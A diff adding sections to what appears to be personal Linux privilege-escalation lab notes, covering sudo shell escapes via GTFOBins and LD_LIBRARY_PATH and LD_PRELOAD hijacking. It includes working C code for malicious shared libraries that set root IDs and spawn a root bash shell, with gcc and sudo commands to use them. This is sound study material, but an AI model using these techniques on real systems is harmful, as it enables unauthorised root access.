@@ -169,7 +169,207 @@ alternatively I can take that same password that I made, and create my own new r
 
 ## Sudo - Shell Escape Sequences
 
+Certain programs run with sudo offer a path to privesc. To find locally what the current user can run as root use `sudo -l`
+
+![image](https://user-images.githubusercontent.com/83407557/183660441-356dc07f-170e-4def-b14b-9888c8ac329e.png)
+
+Linpeas will also show which of these binaries are definite paths to privesc
+
+![image](https://user-images.githubusercontent.com/83407557/183661872-fe85d10c-83df-4401-951e-df8a74452624.png)
+
+
+[Get The Fuck Out Bins](https://gtfobins.github.io/) Is a great resource to use for finding escape sequences with the binaries found.
+
+![image](https://user-images.githubusercontent.com/83407557/183661384-e70f2c55-f22c-498c-b50c-f647929e6486.png)
+
+With this info I can perform shell escapes with each of the binaries marked in yellow by linpeas
+
+iftop
+
+![image](https://user-images.githubusercontent.com/83407557/183664899-befb95ab-3d3e-49c5-a432-1a2bb655ab2c.png)
+
+![image](https://user-images.githubusercontent.com/83407557/183664812-1b74e9da-10ae-44ab-bb4d-a3a7a509bdb5.png)
+
+![image](https://user-images.githubusercontent.com/83407557/183664944-25d50310-6b40-4ac8-8589-14f2e26f7911.png)
+
+
+find
+![image](https://user-images.githubusercontent.com/83407557/183665212-907b18bb-672d-4372-9eaa-9f8d815f9195.png)
+
+![image](https://user-images.githubusercontent.com/83407557/183665377-79da2d96-15d0-4723-b506-8f997bd9c9ea.png)
+
+nano
+
+![image](https://user-images.githubusercontent.com/83407557/183665495-750426a6-332e-42d5-a87e-5327a1910212.png)
+
+
+![image](https://user-images.githubusercontent.com/83407557/183665835-24e1a495-cf5d-492d-a98d-319691e9878f.png)
+
+found this method lets you run commands, but you cannot see typing: example of whoami and id
+
+![image](https://user-images.githubusercontent.com/83407557/183666917-b9d51e97-bc32-4446-a2be-e3e3b40df124.png)
+
+
+
+vim
+
+![image](https://user-images.githubusercontent.com/83407557/183667526-585944d7-f4c1-432c-81b0-063399835b42.png)
+
+![image](https://user-images.githubusercontent.com/83407557/183667596-8e824aff-fec9-4ded-919b-1d14d9033ec0.png)
+
+
+man
+
+![image](https://user-images.githubusercontent.com/83407557/183667684-b3fe2391-0c21-44ca-a06d-b4f29e3d8c2d.png)
+
+![image](https://user-images.githubusercontent.com/83407557/183668011-fbc7279c-6ac0-45f0-9357-f964931132d2.png)
+
+![image](https://user-images.githubusercontent.com/83407557/183668109-78f0b1e0-9c1d-4f5a-810a-7cc06a4217de.png)
+
+![image](https://user-images.githubusercontent.com/83407557/183668204-e05537d3-f8db-4a20-a7da-637571154d83.png)
+
+
+awk
+
+![image](https://user-images.githubusercontent.com/83407557/183668350-e34f9c89-3af5-4eae-beca-876390d61e14.png)
+
+![image](https://user-images.githubusercontent.com/83407557/183668454-2a60204a-0652-4b4a-a86d-087fcc6fe0bc.png)
+
+
+less
+
+![image](https://user-images.githubusercontent.com/83407557/183668596-93b2de52-115c-4318-876b-65e4a6b15684.png)
+
+![image](https://user-images.githubusercontent.com/83407557/183668788-5243d3bd-3811-4298-be49-94b5c51341a0.png)
+
+
+ftp
+
+![image](https://user-images.githubusercontent.com/83407557/183668878-0547f007-a40d-4104-88c5-3ff794342be2.png)
+
+![image](https://user-images.githubusercontent.com/83407557/183669115-6d9c4373-cb99-4b81-b637-3a11cd9b724e.png)
+
+
+nmap
+
+![image](https://user-images.githubusercontent.com/83407557/183669458-375f1d78-c55b-4016-8405-9b21da8ebe72.png)
+
+
+![image](https://user-images.githubusercontent.com/83407557/183669398-b7c6c294-dd7a-4836-963d-57530ac1bd25.png)
+
+or 
+
+![image](https://user-images.githubusercontent.com/83407557/183669640-2c50dccf-d8c0-4a6e-b243-243c9f6cb7a7.png)
+
+
+more
+
+![image](https://user-images.githubusercontent.com/83407557/183669747-b1555a0d-1bed-4079-bb85-8933df2b7305.png)
+
+![image](https://user-images.githubusercontent.com/83407557/183669950-a08f107b-dddf-418c-b96d-07e0eb307baa.png)
+
+
+
 ## Sudo - Environment Variables
+
+The following attack is akin to DLL injection on Windows targets. What is required is a user that has sudo permissions to any binary, and that the LD_PRELOAD or LD_LIBRARY_PATH have the ability to persist(as env variables reset by default).
+
+An example of how env variables reset (note that under Defaults env_reset is active)
+
+![image](https://user-images.githubusercontent.com/83407557/183677801-2b86131b-4689-4c3d-9fc6-d8f2326003e0.png)
+
+Showing that the Env Variable PWD for print working directory resets for root:
+
+![image](https://user-images.githubusercontent.com/83407557/183679001-3526cc6a-229f-41fb-8fd8-40d5c8eedd10.png)
+
+Notice however that on the target Linux machine the env_keep is set for the two env variables I need to perform this attack, as well as several programs I can also use.
+
+![image](https://user-images.githubusercontent.com/83407557/183683506-b128dc18-0fe1-4e37-94d4-a48e12655946.png)
+
+since I have vim on the list I can also see this in the /etc/sudoers file
+
+![image](https://user-images.githubusercontent.com/83407557/183683920-3a14b01a-e022-4c51-879d-1e8061f6f368.png)
+
+### LD_LIBRARY_PATH
+
+To abuse this I can use the following C code
+Note that the code contains a single function that will unset the LD_LIBRARY_PATH variable, and spawn a root bash shell
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+
+static void hijack() __attribute__((constructor));
+
+void hijack() {
+        unsetenv("LD_LIBRARY_PATH");
+        setresuid(0,0,0);
+        system("/bin/bash -p");
+}
+```
+
+I am going to target the only binary that I have sudo access too (apache2) that I did not exploit via a shell escape. First I need to see which shared libraries are used by the program with ldd
+
+![image](https://user-images.githubusercontent.com/83407557/183686555-58dde9ae-31f8-4ec4-aaa1-518c2e6e6af3.png)
+
+I note that the program uses 12 different libraries, I use cut to add them to a file
+
+![image](https://user-images.githubusercontent.com/83407557/183687705-41c43c12-837a-41ef-815d-284abe941d3f.png)
+
+I pick one of the libraries and compile my exploit with the same name
+
+`gcc -o /tmp/libcrypt.so.1 -shared -fPIC lib_path.c`
+
+then using sudo with LD_LIBRARY_PATH set to my malicious lib I get a root shell
+
+![image](https://user-images.githubusercontent.com/83407557/183690738-92f5098f-1ed2-4427-b66e-df05633caf0a.png)
+
+doing the same with libpthread.so.0
+
+`gcc -o /tmp/libpthread.so.0 -shared -fPIC lib_path.c`
+
+![image](https://user-images.githubusercontent.com/83407557/183691857-182f6701-575f-4aa9-8165-0a2e81dc926c.png)
+
+
+### LD_PRELOAD
+
+This attack allows us to inject a shared object into the program before it is run.
+
+Almost identical code that unsets the LD_PRELOAD variable and spawns a root bash shell
+
+```c
+#include <stdio.h>
+#include <sys/types.h>
+#include <stdlib.h>
+
+void _init() {
+        unsetenv("LD_PRELOAD");
+        setresuid(0,0,0);
+        system("/bin/bash -p");
+}
+```
+
+Creating with nano
+
+![image](https://user-images.githubusercontent.com/83407557/183692721-fca855fd-2f7b-46a1-9f18-48c864a0b6aa.png)
+
+
+compiling
+
+`gcc -fPIC -shared -nostartfiles -o /tmp/preload.so preload.c`
+
+running
+
+`sudo LD_PRELOAD=/tmp/preload.so program-name-here`
+
+apache2 example
+
+![image](https://user-images.githubusercontent.com/83407557/183694347-0ed7facc-90ad-48a7-a467-4c73e91bf040.png)
+
+various other sudo programs will also work, each time I get a root shell before the program even loads
+
+
+![image](https://user-images.githubusercontent.com/83407557/183695078-2065f98d-9afa-4060-b216-692d5e378423.png)
 
 ## Cron Jobs - File Permissions
 
